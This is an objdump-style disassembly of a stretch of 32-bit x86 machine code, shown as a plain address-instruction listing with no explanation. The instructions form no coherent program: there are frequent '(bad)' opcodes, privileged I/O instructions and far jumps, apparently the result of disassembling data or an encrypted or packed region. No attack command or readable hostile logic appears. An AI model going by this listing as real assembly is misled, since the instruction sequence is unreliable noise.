  421442:	add    dh,BYTE PTR [eax+ebp*1-0x6]
  421446:	retf   
  421447:	leave  
  421448:	cmp    ah,ah
  42144a:	or     eax,0x8a797aae
  42144f:	sbb    DWORD PTR ds:0x6664c017,esp
  421455:	fwait
  421456:	sbb    al,0xe8
  421458:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421459:	(bad)  
  42145a:	adc    al,0x5a
  42145c:	iret   
  42145d:	adc    esp,DWORD PTR [eax]
  42145f:	add    ah,BYTE PTR [esi]
  421461:	(bad)  
  421462:	mov    DWORD PTR [ecx-0x35f38234],ebx
  421468:	js     0x4214c6
  42146a:	mov    eax,ds:0x5774aa0c
  42146f:	or     al,0x69
  421471:	push   edi
  421472:	adc    BYTE PTR [ebx],dl
  421474:	cmp    edi,DWORD PTR [ecx+0x6e97146a]
  42147a:	push   ss
  42147b:	ss jg  0x4214f9
  42147e:	pop    ecx
  42147f:	inc    esi
  421480:	cmp    al,0x48
  421482:	cmc    
  421483:	sar    DWORD PTR [ebx+0x37],1
  421486:	jl     0x421495
  421488:	sub    edi,DWORD PTR [eax-0x6ff2f6f0]
  42148e:	cmp    ebx,0x1c
  421491:	sbb    eax,0xf0d43526
  421496:	push   eax
  421497:	add    eax,DWORD PTR [ecx]
  421499:	sub    bh,dh
  42149b:	mov    dl,0x6b
  42149d:	sbb    edi,DWORD PTR [eax+0x31]
  4214a0:	mov    bh,0x13
  4214a2:	inc    eax
  4214a3:	jmp    0x73cb:0xd3c75cc0
  4214aa:	stc    
  4214ab:	dec    edx
  4214ac:	cdq    
  4214ad:	add    ch,BYTE PTR [edi]
  4214af:	in     al,dx
  4214b0:	push   0xffffffa4
  4214b2:	fistp  DWORD PTR [ebp-0x7a7157bb]
  4214b8:	dec    edx
  4214b9:	and    eax,0x81b81a2c
  4214be:	jle    0x42144c
  4214c0:	into   
  4214c1:	ins    BYTE PTR es:[edi],dx
  4214c2:	repnz push eax
  4214c4:	add    eax,DWORD PTR [ebx-0x51d6d61d]
  4214ca:	add    eax,0xc792c15f
  4214cf:	jge    0x421475
  4214d1:	sub    al,0xae
  4214d3:	jl     0x4214cc
  4214d5:	pop    es
  4214d6:	mov    ebp,0xda6f46f
  4214db:	scas   al,BYTE PTR es:[edi]
  4214dc:	dec    ebp
  4214dd:	dec    ebp
  4214de:	pop    eax
  4214df:	push   ss
  4214e0:	adc    DWORD PTR [esp+ebx*8-0x3b],eax
  4214e4:	add    ah,BYTE PTR [eax]
  4214e6:	ins    BYTE PTR es:[edi],dx
  4214e7:	popf   
  4214e8:	repz fdiv DWORD PTR ss:[edi+0x1e]
  4214ed:	mov    cl,0xb4
  4214ef:	xor    eax,0x63d26012
  4214f4:	jnp    0x42156b
  4214f6:	mov    ch,0x6f
  4214f8:	ficom  WORD PTR [esi+eax*4]
  4214fb:	sti    
  4214fc:	mul    dh
  4214fe:	sbb    DWORD PTR [eax+0x18],ebp
  421501:	(bad)  [ebp+0x6f]
  421504:	test   al,0x58
  421506:	xchg   edi,eax
  421507:	(bad)  
  421508:	jg     0x4214bf
  42150a:	mov    eax,0xd614514a
  42150f:	retf   0xc841
  421512:	hlt    
  421513:	inc    eax
  421514:	push   esp
  421515:	jecxz  0x421586
  421517:	push   0x82d7ff49
  42151c:	mov    al,ds:0xb81bd2a5
  421521:	mov    DWORD PTR [ebp+0x56e75679],ecx
  421527:	adc    DWORD PTR [esi+0x2be414bb],ecx
  42152d:	adc    eax,0xc10d5226
  421532:	or     dh,BYTE PTR [esi+0x33]
  421535:	stc    
  421536:	sub    edi,DWORD PTR [edi+0x16b629a4]
  42153c:	out    dx,al
  42153d:	mov    gs,WORD PTR [edx-0x79642d60]
  421543:	dec    eax
  421544:	xor    eax,0xc62d3184
  421549:	mov    al,0xb3
  42154b:	stc    
  42154c:	je     0x4214e4
  42154e:	mov    edi,0xbd4a712d
  421553:	or     edi,esp
  421555:	adc    al,0x8c
  421557:	sub    ebx,DWORD PTR [edi]
  421559:	fcom   QWORD PTR [esi]
  42155b:	sub    BYTE PTR [ebx],dh
  42155d:	xchg   edi,eax
  42155e:	inc    ebx
  42155f:	adc    DWORD PTR [ebx],ecx
  421561:	add    al,0x71
  421563:	sbb    al,0x16
  421565:	out    dx,eax
  421566:	jge    0x421580
  421568:	imul   esi,DWORD PTR [edi],0xffffffa1
  42156b:	sbb    ch,dh
  42156d:	aad    0x70
  42156f:	test   BYTE PTR [ebx+ebx*8+0x4f],dh
  421573:	xchg   edx,eax
  421575:	test   al,0x0
  421577:	adc    DWORD PTR [ecx],esp
  421579:	je     0x42156b
  42157b:	(bad)  
  42157c:	mov    al,ds:0x4e8c86c
  421581:	dec    esp
  421582:	call   esi
  421584:	xor    DWORD PTR [edi],edi
  421586:	out    0x24,eax
  421588:	shr    BYTE PTR [ecx+0x5e93d5a9],cl
  42158e:	sub    bh,cl
  421590:	jne    0x421522
  421592:	mov    ah,0x2a
  421594:	gs jmp 0x4215f0
  421597:	test   al,0xfe
  421599:	or     cl,BYTE PTR [ecx-0x5c]
  42159c:	repnz mov eax,ds:0x507b4336
  4215a2:	xchg   ebp,edi
  4215a4:	cmp    eax,DWORD PTR [eax+0x26]
  4215a7:	jl     0x421538
  4215a9:	test   eax,0xe579764e
  4215ae:	test   al,0x7d
  4215b0:	fcomp  QWORD PTR [ebx-0x35765da1]
  4215b6:	lods   eax,DWORD PTR ds:[esi]
  4215b7:	in     eax,dx
  4215b8:	cmp    al,BYTE PTR [esi+ecx*8]
  4215bb:	mov    DWORD PTR [ecx+0x71],edx
  4215be:	fisub  DWORD PTR [edx+0x6121112c]
  4215c4:	sub    eax,0xda7c179c
  4215c9:	out    dx,al
  4215ca:	pop    esp
  4215cb:	mov    esi,0x86f74117
  4215d0:	std    
  4215d1:	dec    edx
  4215d2:	idiv   DWORD PTR [ecx-0x59]
  4215d5:	jnp    0x4215cd
  4215d7:	jbe    0x4215a5
  4215d9:	shl    BYTE PTR [eax+0x36caead4],1
  4215df:	and    bl,BYTE PTR ds:0x30787b20
  4215e5:	es pop ds
  4215e7:	jno    0x421651
  4215e9:	loopne 0x4215cc
  4215eb:	xchg   BYTE PTR ds:0x958cffe,cl
  4215f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4215f2:	cmp    al,BYTE PTR [esi]
  4215f4:	fwait
  4215f5:	ds jg  0x4215b3
  4215f8:	rcl    DWORD PTR [ebx],0x50
  4215fb:	int3   
  4215fc:	push   ebx
  4215fd:	(bad)  
  4215fe:	or     eax,0x1338b5d6
  421603:	or     edi,DWORD PTR [edx+ebx*2-0x4a]
  421607:	cld    
  421608:	dec    ecx
  421609:	je     0x4215ad
  42160b:	test   DWORD PTR [ebp-0x4d],ebx
  42160e:	loopne 0x421611
  421610:	sar    BYTE PTR [edi+0x761d1a53],cl
  421616:	mov    eax,DWORD PTR [edx-0x5ef8bb91]
  42161c:	jns    0x42168a
  42161e:	ds push ecx
  421620:	jbe    0x4215a7
  421622:	ret    
  421623:	aad    0x67
  421625:	push   edi
  421626:	lods   al,BYTE PTR ds:[esi]
  421627:	xor    eax,0xe2150145
  42162c:	cmp    cl,bl
  42162e:	xchg   ebp,eax
  42162f:	push   edx
  421630:	mov    edi,DWORD PTR [ecx-0x64]
  421633:	aad    0xa
  421635:	ds mov eax,0xd335a06c
  42163b:	shl    BYTE PTR [ebp+ecx*2+0x6987ae3e],0x5b
  421643:	out    0xfc,al
  421645:	lods   eax,DWORD PTR ds:[esi]
  421646:	and    bh,cl
  421648:	cdq    
  421649:	idiv   BYTE PTR [edx]
  42164b:	sbb    DWORD PTR [edx+0x31],edi
  42164e:	and    ch,BYTE PTR [esi-0x7d6f853d]
  421654:	xchg   edi,eax
  421655:	jns    0x42167a
  421657:	pop    esi
  421658:	and    bl,BYTE PTR [edi]
  42165a:	adc    eax,0x9b771863
  42165f:	dec    eax
  421660:	jl     0x4216b2
  421662:	repz test eax,0xf0e0e744
  421668:	es xchg DWORD PTR fs:[ebp-0x22],esp
  42166d:	out    dx,eax
  42166e:	jmp    0x421614
  421670:	in     al,dx
  421671:	imul   edi,DWORD PTR [eax],0x46
  421674:	xchg   edx,eax
  421675:	pop    ebp
  421676:	cdq    
  421677:	push   edi
  421678:	and    BYTE PTR [edx-0x42],dl
  42167b:	wbinvd 
  42167d:	fidivr DWORD PTR [ecx-0x2606ed2d]
  421683:	push   edi
  421684:	pop    es
  421685:	jg     0x42168a
  421687:	and    BYTE PTR [esi],ah
  421689:	jb     0x421648
  42168b:	ss xchg ecx,eax
  42168d:	ficom  WORD PTR [esi]
  42168f:	leave  
  421690:	int    0x64
  421692:	pop    esi
  421693:	pop    eax
  421694:	pop    edi
  421695:	mov    DWORD PTR [ecx-0x38],ecx
  421698:	test   eax,0xc9613ecd
  42169d:	add    eax,0xd492af6a
  4216a2:	sti    
  4216a3:	cmp    eax,0x614ae3e6
  4216a8:	cmp    DWORD PTR [esp+ebp*4+0x4b5c311b],edi
  4216af:	push   es
  4216b0:	xor    eax,0x106b5130
  4216b5:	add    DWORD PTR [esp+eax*1],ebp
  4216b8:	push   ecx
  4216b9:	scas   eax,DWORD PTR es:[edi]
  4216ba:	clc    
  4216bb:	jp     0x4216cc
  4216bd:	push   ss
  4216be:	fs mov ch,cl
  4216c1:	sbb    edi,ebx
  4216c3:	fisttp DWORD PTR [ebx]
  4216c5:	inc    esp
  4216c6:	sub    eax,0xa1939b5f
  4216cb:	aaa    
  4216cc:	adc    eax,DWORD PTR [eax]
  4216ce:	loope  0x421715
  4216d0:	in     al,0xc5
  4216d2:	jbe    0x42167c
  4216d4:	sub    eax,0xd4b06ff2
  4216d9:	and    esp,DWORD PTR [edx-0x5e3d4573]
  4216df:	repnz jecxz 0x4216f4
  4216e2:	push   0x1e26ab95
  4216e7:	les    ecx,FWORD PTR [edx+0x41]
  4216ea:	pop    es
  4216eb:	mov    ch,0x16
  4216ed:	jecxz  0x4216d5
  4216ef:	cmp    bl,ah
  4216f1:	inc    ebp
  4216f2:	sahf   
  4216f3:	(bad)  
  4216f4:	in     eax,0x6d
  4216f6:	or     ebx,DWORD PTR [edi+esi*1]
  4216f9:	jecxz  0x42168d
  4216fb:	test   bh,ah
  4216fd:	loopne 0x4216e6
  4216ff:	or     eax,0x6a8973be
  421704:	lods   al,BYTE PTR ds:[esi]
  421705:	push   edx
  421706:	out    dx,al
  421707:	out    0xf1,al
  421709:	mov    ebx,0x36b2d64a
  42170e:	test   edx,0x416424bd
  421714:	sti    
  421715:	mov    ecx,0x3ecdc678
  42171a:	mov    cs,eax
  42171c:	and    ebx,ecx
  42171e:	xchg   ebp,eax
  42171f:	stc    
  421720:	adc    eax,0xe642acbd
  421725:	mov    ds:0xf343970a,eax
  42172a:	push   ecx
  42172b:	xchg   ecx,eax
  42172c:	popf   
  42172d:	jo     0x4216d9
  42172f:	repnz mov edi,0x4e6bda6f
  421735:	or     esi,DWORD PTR [eax+0x58]
  421738:	dec    edx
  421739:	shl    DWORD PTR ds:0x2e5ede1a,1
  42173f:	pop    ebx
  421740:	jmp    0x632:0xbbfc8b8b
  421747:	pop    es
  421748:	and    DWORD PTR [edx+0x7c1f053d],0x25
  42174f:	jno    0x42175c
  421751:	cmp    bl,BYTE PTR [esi-0x33]
  421754:	dec    edx
  421755:	es add edx,0x3e4047c1
  42175c:	push   esi
  42175d:	sti    
  42175e:	imul   eax,DWORD PTR [ebp+ecx*8-0x6],0xf5ca4079
  421766:	pop    esp
  421767:	cli    
  421768:	dec    edx
  421769:	mov    esp,0x883b3250
  42176e:	stc    
  42176f:	adc    BYTE PTR [edi-0x1e],bh
  421772:	loop   0x42179c
  421774:	pop    edx
  421775:	inc    eax
  421776:	inc    eax
  421777:	popa   
  421778:	jmp    0xd1f514f5
  42177d:	pop    ecx
  42177e:	ins    DWORD PTR es:[edi],dx
  42177f:	retf   0xb476
  421782:	jae    0x421716
  421784:	cmp    ecx,ebx
  421786:	in     eax,0x42
  421788:	push   esi
  421789:	jg     0x421795
  42178b:	rol    edi,0x60
  42178e:	push   eax
  42178f:	and    al,0xe
  421791:	loope  0x421771
  421793:	mov    ecx,0xa95819e1
  421798:	int3   
  421799:	add    al,dh
  42179b:	adc    DWORD PTR [esi+ebx*1],eax
  42179e:	cli    
  42179f:	push   ebp
  4217a0:	add    BYTE PTR [eax-0xe],dl
  4217a3:	cli    
  4217a4:	push   esp
  4217a5:	mov    BYTE PTR [eax-0x4252761c],bh
  4217ab:	push   ds
  4217ac:	popa   
  4217ad:	xor    al,0xb3
  4217af:	rcl    BYTE PTR cs:[eax+0x7eb6623a],cl
  4217b6:	adc    al,0xef
  4217b8:	mov    al,ds:0x1e9927cf
  4217bd:	aad    0x6d
  4217bf:	mov    ds:0x55696fe7,eax
  4217c4:	fldcw  WORD PTR [edx+0x0]
  4217c7:	or     dh,0xa4
  4217ca:	jne    0x42182d
  4217cc:	dec    edi
  4217cd:	xchg   DWORD PTR ds:0x7c2c6264,ecx
  4217d3:	mov    esp,0x59cfcc5e
  4217d8:	mov    bl,0xe5
  4217da:	loope  0x421848
  4217dc:	fistp  QWORD PTR [ebx+ecx*2-0x25]
  4217e0:	mov    BYTE PTR [esi+edx*4+0x49b31475],dh
  4217e7:	sub    eax,0x611e773b
  4217ec:	mov    ah,0xa6
  4217ee:	lods   al,BYTE PTR ds:[esi]
  4217ef:	imul   esp,DWORD PTR [edi],0xffffffab
  4217f2:	mov    bl,0xd3
  4217f4:	xor    BYTE PTR [edx-0x1],cl
  4217f7:	mov    ecx,0xb6fc58b8
  4217fc:	dec    eax
  4217fd:	adc    DWORD PTR [edx+0x76ae3a05],esp
  421803:	into   
  421804:	mov    dl,0xf0
  421806:	fwait
  421807:	scas   eax,DWORD PTR es:[edi]
  421808:	ins    DWORD PTR es:[edi],dx
  421809:	jmp    0xf0bd345d
  42180e:	jae    0x421857
  421810:	retf   0x7537
  421813:	sar    BYTE PTR [ebx-0x1a47f90b],cl
  421819:	ins    DWORD PTR es:[edi],dx
  42181a:	imul   ebp,DWORD PTR [edx-0x80],0x3d2a624a
  421821:	call   0xb599a710
  421826:	push   edx
  421827:	(bad)  
  421829:	and    DWORD PTR [edx],eax
  42182b:	mov    ds:0x6cfe7e56,al
  421830:	cmp    ah,BYTE PTR [ebx+0x77]
  421833:	mov    ds,edi
  421835:	xchg   ebx,eax
  421836:	add    al,0xb1
  421838:	xor    eax,esi
  42183a:	xchg   DWORD PTR [ebx-0x45],ebx
  42183d:	std    
  42183e:	add    esp,DWORD PTR ds:0x5f1f2d74
  421844:	push   esi
  421845:	push   0xffffffd1
  421847:	mov    edx,0x8ba7c7d4
  42184c:	bound  ecx,QWORD PTR [ebx]
  42184e:	sub    BYTE PTR [ebx-0x7927c194],dl
  421854:	add    dl,BYTE PTR [eax+eax*2+0x6705e8ee]
  42185b:	xchg   ecx,eax
  42185c:	pop    es
  42185d:	es xchg ecx,eax
  42185f:	ficom  WORD PTR [ebx+0x7a7c8ad2]
  421865:	scas   al,BYTE PTR es:[edi]
  421866:	aad    0xe8
  421868:	add    DWORD PTR [edx],esp
  42186a:	xor    eax,0x85d65644
  42186f:	pop    ebx
  421870:	push   edi
  421871:	lahf   
  421872:	arpl   WORD PTR [edi+0x4f],ax
  421875:	test   al,0xc6
  421877:	int    0xf4
  421879:	dec    ebx
  42187a:	pusha  
  42187b:	jb     0x42188c
  42187d:	(bad)  
  42187e:	mov    eax,0x8c0ed44b
  421883:	(bad)  
  421884:	outs   dx,DWORD PTR ds:[esi]
  421885:	and    dl,BYTE PTR [ecx-0x1b0778e5]
  42188b:	xor    BYTE PTR [esi],bl
  42188d:	jmp    0x805cfd59
  421892:	stc    
  421893:	ror    DWORD PTR [ebx-0x6e41c247],1
  421899:	jge    0x42181b
  42189b:	or     BYTE PTR [eax],bh
  42189d:	pop    edi
  42189e:	call   0x1eb:0x58c58196
  4218a5:	pop    ecx
  4218a6:	cmp    eax,0x4af48f29
  4218ab:	hlt    
  4218ac:	fucomp st(6)
  4218ae:	xchg   ecx,eax
  4218af:	sub    eax,0x96aef598
  4218b4:	add    al,0x24
  4218b6:	mov    WORD PTR [eax],cs
  4218b8:	lea    edx,[ecx-0x74]
  4218bb:	jmp    0x421917
  4218bd:	inc    ebx
  4218be:	stc    
  4218bf:	add    bh,BYTE PTR [edi+0x72]
  4218c2:	dec    edx
  4218c3:	add    bl,ah
  4218c5:	ss inc esi
  4218c7:	push   esp
  4218c8:	loopne 0x4218b1
  4218ca:	clc    
  4218cb:	ins    BYTE PTR es:[edi],dx
  4218cc:	es cs mov cl,0x1d
  4218d0:	ss inc edi
  4218d2:	popf   
  4218d3:	mov    ebp,0x4b08c231
  4218d8:	retf   0x1058
  4218db:	shl    edi,cl
  4218dd:	addr16 aaa 
  4218df:	dec    eax
  4218e0:	xor    al,0x91
  4218e2:	add    BYTE PTR [esi-0x1c],0x52
  4218e6:	mov    bl,0xf2
  4218e8:	loopne 0x4218ec
  4218ea:	dec    ebx
  4218eb:	scas   al,BYTE PTR es:[di]
  4218ed:	mov    ecx,0x15966e0c
  4218f2:	test   BYTE PTR [edx+0x19],ah
  4218f5:	(bad)  
  4218f6:	cmp    eax,DWORD PTR [esi+0x6ee1c87f]
  4218fc:	inc    ebx
  4218fd:	aaa    
  4218fe:	pop    es
  4218ff:	mov    eax,0x7df7ab48
  421904:	sub    esp,DWORD PTR [ebp+edx*2+0x27]
  421908:	(bad)  
  421909:	ja     0xa225071d
  42190f:	xchg   ecx,eax
  421910:	dec    di
  421912:	mov    dl,0xa0
  421914:	sbb    bl,bl
  421916:	cdq    
  421917:	mov    DWORD PTR [ebx],esi
  421919:	cmp    eax,0x1a22c6df
  42191e:	lods   eax,DWORD PTR ds:[esi]
  42191f:	adc    dh,BYTE PTR [edi-0x76]
  421922:	add    eax,0xd50644a9
  421927:	popa   
  421928:	cli    
  421929:	xor    BYTE PTR [ecx],cl
  42192b:	mov    WORD PTR [ecx],gs
  42192d:	stos   DWORD PTR es:[edi],eax
  42192e:	inc    esi
  42192f:	loope  0x4218c1
  421931:	mov    al,0x5b
  421933:	push   ds
  421934:	js     0x42194b
  421936:	xchg   ebx,eax
  421937:	and    BYTE PTR [esi-0x91e47e6],0xa
  42193e:	ret    
  42193f:	enter  0x468a,0xfe
  421943:	sar    BYTE PTR [esi+0x46e0aa62],1
  421949:	and    DWORD PTR [ecx-0x3b],ebp
  42194c:	pop    edx
  42194d:	sbb    eax,0xe3f2c8aa
  421952:	mov    edx,ss
  421954:	push   esp
  421955:	aas    
  421956:	push   ds
  421957:	lds    ebx,FWORD PTR [eax]
  421959:	outs   dx,BYTE PTR ds:[esi]
  42195a:	popa   
  42195b:	adc    al,0x3a
  42195d:	xchg   ecx,eax
  42195e:	or     bl,BYTE PTR [eax]
  421960:	xchg   bp,ax
  421962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421963:	test   BYTE PTR [ebx+0x42c3c853],0xc1
  42196a:	stc    
  42196b:	rol    esi,1
  42196d:	not    DWORD PTR [ebp+0x1132afd0]
  421973:	mov    eax,ds:0x7e6764ec
  421978:	cmp    BYTE PTR [eax+0x74],cl
  42197b:	popa   
  42197c:	pop    edx
  42197d:	jp     0x421978
  42197f:	dec    eax
  421980:	test   ebx,esp
  421982:	cli    
  421983:	xchg   esp,eax
  421984:	mov    esi,0xb03c56a4
  421989:	repz stc 
  42198b:	lock ror DWORD PTR [ecx+0x4],cl
  42198f:	add    BYTE PTR [ecx+ecx*2-0x34818424],al
  421996:	dec    ecx
  421997:	lea    esi,[esi]
  421999:	mov    WORD PTR [ebx-0xcdfb37d],?
  42199f:	test   eax,0x962315ad
  4219a5:	sbb    ch,ch
  4219a7:	je     0x421962
  4219a9:	ret    0x27f0
  4219ac:	lds    esp,FWORD PTR [edi]
  4219ae:	sub    eax,0x16abdad1
  4219b3:	lods   al,BYTE PTR ds:[esi]
  4219b4:	(bad)  
  4219b5:	arpl   WORD PTR [eax],di
  4219b7:	pop    ebp
  4219b8:	aam    0x7a
  4219ba:	mov    esi,0x2dcc3b3
  4219bf:	aaa    
  4219c0:	xor    bl,BYTE PTR [edx]
  4219c2:	enter  0x5334,0x8e
  4219c6:	jle    0x421954
  4219c8:	sbb    al,BYTE PTR [edx-0x35d633c1]
  4219ce:	jo     0x421a04
  4219d0:	push   esp
  4219d1:	mov    ebx,0x1fd162ed
  4219d6:	xchg   ebp,eax
  4219d7:	imul   ebp,DWORD PTR [edx+0x758a94e7],0xee961f01
  4219e1:	xchg   DWORD PTR [eax],eax
  4219e3:	scas   al,BYTE PTR es:[edi]
  4219e4:	xchg   edx,eax
  4219e5:	sub    bh,BYTE PTR [eax-0x13364a0e]
  4219eb:	xchg   edx,esp
  4219ed:	sub    edx,edi
  4219ef:	mov    ch,0x82
  4219f1:	pusha  
  4219f2:	xchg   ecx,ecx
  4219f4:	or     BYTE PTR [eax-0xb],bh
  4219f7:	(bad)  
  4219f8:	ror    DWORD PTR [ebp-0xa],cl
  4219fb:	and    al,0xf4
  4219fd:	add    BYTE PTR [edx-0x33],dl
  421a00:	sbb    al,0x7a
  421a02:	out    dx,eax
  421a03:	clc    
  421a04:	mov    ds:0x80f70c6,eax
  421a09:	dec    edx
  421a0a:	mov    eax,0x38ea97aa
  421a0f:	xor    al,BYTE PTR [ecx]
  421a11:	in     eax,dx
  421a12:	es xchg edi,eax
  421a14:	(bad)  [edi]
  421a16:	jle    0x4219a0
  421a18:	fsub   st,st(6)
  421a1a:	es mov edi,0x474eba3a
  421a20:	mov    ds:0x62855fc2,eax
  421a25:	lahf   
  421a26:	lahf   
  421a27:	mov    bh,0x72
  421a29:	in     al,0x9
  421a2b:	popf   
  421a2c:	mov    edi,0xac73cd16
  421a31:	mov    ch,0x30
  421a33:	adc    eax,0x55e473fc
  421a38:	jbe    0x421a5c
  421a3a:	fild   WORD PTR [ebx+0x76]
  421a3d:	adc    DWORD PTR [ecx-0x7f],esp
  421a40:	das    
  421a41:	sbb    ebx,DWORD PTR [ebx]
  421a43:	cld    
  421a44:	mov    DWORD PTR [esp+ebx*8+0x5a],0x42d2ef2a
  421a4c:	mov    esi,0x77fba978
  421a51:	add    ah,BYTE PTR [ebx*1-0x2942a2a5]
  421a58:	aaa    
  421a59:	mov    al,ds:0xb342830a
  421a5e:	dec    ebp
  421a5f:	and    eax,0x754aeba4
  421a64:	enter  0x5ce3,0xfd
  421a68:	or     ah,BYTE PTR ds:0x60299491
  421a6e:	jge    0x421ad8
  421a70:	jge    0x421a71
  421a72:	or     eax,0x4a4b3b08
  421a77:	aad    0x76
  421a79:	push   0xffffffee
  421a7b:	and    DWORD PTR [eax-0x50],esi
  421a7e:	aam    0xa8
  421a80:	mov    esp,0x8cf7abcd
  421a85:	inc    esi
  421a86:	add    dl,al
  421a88:	jl     0x421a3f
  421a8a:	xchg   edx,eax
  421a8b:	xchg   ebp,eax
  421a8c:	xchg   esi,eax
  421a8d:	xchg   ecx,eax
  421a8e:	imul   ebp,DWORD PTR [edx-0x4d],0xfffffff1
  421a92:	push   ds
  421a93:	add    esp,DWORD PTR [edx-0x64]
  421a96:	test   al,0x23
  421a98:	in     eax,dx
  421a99:	pop    ebx
  421a9a:	jns    0x421a59
  421a9c:	scas   al,BYTE PTR es:[edi]
  421a9d:	call   0x45b4:0xb4d29e6
  421aa4:	out    0x97,al
  421aa6:	pop    eax
  421aa7:	cdq    
  421aa8:	or     al,0x2a
  421aaa:	add    DWORD PTR [esi-0x3e],edi
  421aad:	dec    esp
  421aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aaf:	fisubr WORD PTR [eax+ebx*4-0x2995651d]
  421ab6:	mov    edi,0x54a98dd3
  421abb:	repz sahf 
  421abd:	ja     0x421ac5
  421abf:	lds    ebx,FWORD PTR [eax-0x6b093fb5]
  421ac5:	pop    ebx
  421ac6:	adc    ebx,0xf0dac4d4
  421acc:	clc    
  421acd:	clc    
  421ace:	in     al,0x71
  421ad0:	ret    
  421ad1:	jns    0x421a82
  421ad3:	mov    edi,0xcef9b7b5
  421ad8:	sub    BYTE PTR [ebx],dl
  421ada:	mov    DWORD PTR [ebx+0x1c1faea],esp
  421ae0:	int    0x76
  421ae2:	std    
  421ae3:	xchg   ebx,eax
  421ae4:	popf   
  421ae5:	mov    eax,0x28918337
  421aea:	test   BYTE PTR [ecx],bh
  421aec:	fdivr  st,st(4)
  421aee:	mov    eax,0xeec8272a
  421af3:	jecxz  0x421b02
  421af5:	dec    esp
  421af6:	mov    edx,0x9628013c
  421afb:	xor    DWORD PTR [edi+0x16],esp
  421afe:	jle    0x421b7f
  421b00:	nop
  421b01:	mov    al,ds:0xa6f18136
  421b06:	pop    es
  421b07:	inc    ecx
  421b08:	xor    al,0xa6
  421b0a:	sub    eax,DWORD PTR ds:0x7a2399d6
  421b10:	retf   0xbde4
  421b13:	push   ds
  421b14:	rcr    ch,1
  421b16:	mov    esp,0x754d4aee
  421b1b:	xor    DWORD PTR [eax+ebp*2-0x46],esi
  421b1f:	jle    0x421aab
  421b21:	sbb    al,0x3d
  421b23:	adc    dl,bh
  421b25:	mov    bl,0xa8
  421b27:	jle    0x421b6a
  421b29:	sahf   
  421b2a:	and    esi,DWORD PTR [esi-0x40129a28]
  421b30:	cwde   
  421b31:	mov    ecx,0x4d80bd09
  421b36:	je     0x421afa
  421b38:	adc    eax,0xef4c70c0
  421b3d:	out    0xb3,al
  421b3f:	les    eax,FWORD PTR [eax+0x66eb9bf5]
  421b45:	clc    
  421b46:	jb     0x421ba5
  421b48:	into   
  421b49:	jns    0x421b89
  421b4b:	mov    BYTE PTR [edi-0x22],0x74
  421b4f:	pop    ecx
  421b50:	or     BYTE PTR [ebx+eax*4],al
  421b53:	das    
  421b54:	mov    WORD PTR [edx+0x32],ss
  421b57:	push   ebp
  421b58:	leave  
  421b59:	push   esi
  421b5a:	rcl    DWORD PTR [eax-0x1b8cfa5],cl
  421b60:	shr    BYTE PTR [edi+0x6f20f83f],1
  421b66:	mov    edx,0xe4de9cdf
  421b6b:	out    dx,al
  421b6c:	mov    edi,0x3b2f2991
  421b71:	cmp    edi,DWORD PTR [esi+0x6c341da8]
  421b77:	scas   eax,DWORD PTR es:[edi]
  421b78:	sbb    eax,DWORD PTR [ecx+edi*1]
  421b7b:	xor    dh,BYTE PTR [ecx+0x6cc6d781]
  421b81:	mov    WORD PTR [eax-0x45],es
  421b84:	sub    edx,ebp
  421b86:	xor    ecx,edx
  421b88:	iret   
  421b89:	in     eax,0x7c
  421b8b:	jle    0x421bcc
  421b8d:	cmp    al,BYTE PTR [eax+0x3f]
  421b90:	add    al,0x1a
  421b92:	dec    edx
  421b93:	loopne 0x421bfa
  421b95:	fcomp  DWORD PTR [edx-0xa144970]
  421b9b:	ds jge 0x421b68
  421b9e:	fldenv [ecx+0x5248b6e6]
  421ba4:	xchg   esi,eax
  421ba5:	inc    DWORD PTR [edi+0x34]
  421ba8:	hlt    
  421ba9:	mov    BYTE PTR [ecx],ch
  421bab:	inc    esp
  421bac:	adc    eax,0x8c6037c9
  421bb1:	cmp    cl,BYTE PTR [ecx+0x54]
  421bb4:	stos   DWORD PTR es:[edi],eax
  421bb5:	sub    BYTE PTR ds:0xa932c1b6,al
  421bbb:	outs   dx,DWORD PTR ds:[esi]
  421bbc:	or     BYTE PTR [edx+ebx*2-0x3d],ah
  421bc0:	lea    ecx,[edi-0x4345a76]
  421bc6:	mov    ebx,0x50eb940a
  421bcb:	fsubp  st(4),st
  421bcd:	and    al,0xa1
  421bcf:	sub    al,0x2e
  421bd1:	stos   DWORD PTR es:[edi],eax
  421bd2:	call   0xa6a6d41a
  421bd7:	lods   al,BYTE PTR ds:[esi]
  421bd8:	fisub  DWORD PTR [ebx]
  421bda:	ins    BYTE PTR es:[edi],dx
  421bdb:	aaa    
  421bdc:	xor    BYTE PTR [edi+0x5c857789],cl
  421be2:	mov    eax,ds:0xc88c526f
  421be7:	not    DWORD PTR [ebx+esi*2+0x60b7e0a0]
  421bee:	xor    BYTE PTR [ecx+0x30],ch
  421bf1:	pusha  
  421bf2:	fcmovbe st,st(5)
  421bf4:	push   0x2
  421bf6:	nop
  421bf7:	les    edi,FWORD PTR [edx-0x5de5e196]
  421bfd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421bfe:	test   eax,ebp
  421c00:	sbb    BYTE PTR [edi+eiz*2+0x6b],al
  421c04:	cs jmp 0x8bc2:0x43ab29de
  421c0c:	shl    ecx,0x7c
  421c0f:	pop    esi
  421c10:	stos   BYTE PTR es:[edi],al
  421c11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c12:	sbb    DWORD PTR [esi],esi
  421c14:	jmp    0x421c54
  421c16:	lock and al,0x6c
  421c19:	mov    bh,0xf
  421c1b:	sbb    DWORD PTR [esi+0x52cf0b68],edi
  421c21:	cwde   
  421c22:	and    al,0x10
  421c25:	mov    eax,ds:0xab1e3f78
  421c2a:	add    DWORD PTR [ebp-0x80],0x7e
  421c2e:	cli    
  421c2f:	lods   al,BYTE PTR ds:[esi]
  421c30:	icebp  
  421c31:	adc    eax,0x7345a015
  421c36:	xor    BYTE PTR [ebp-0x1b],dh
  421c39:	fdiv   DWORD PTR [ebp+0x24623a03]
  421c3f:	loope  0x421cb4
  421c41:	xchg   ebp,eax
  421c42:	mov    ds,ebx
  421c44:	cmp    ch,BYTE PTR ss:[edx]
  421c47:	jae    0x421c75
  421c49:	push   ebp
  421c4a:	(bad)
  421c4d:	mov    BYTE PTR [eax+0x56493aa9],dh
  421c53:	or     ch,BYTE PTR [ebx+0x19552db7]
  421c59:	add    dl,BYTE PTR [eax-0x4c693275]
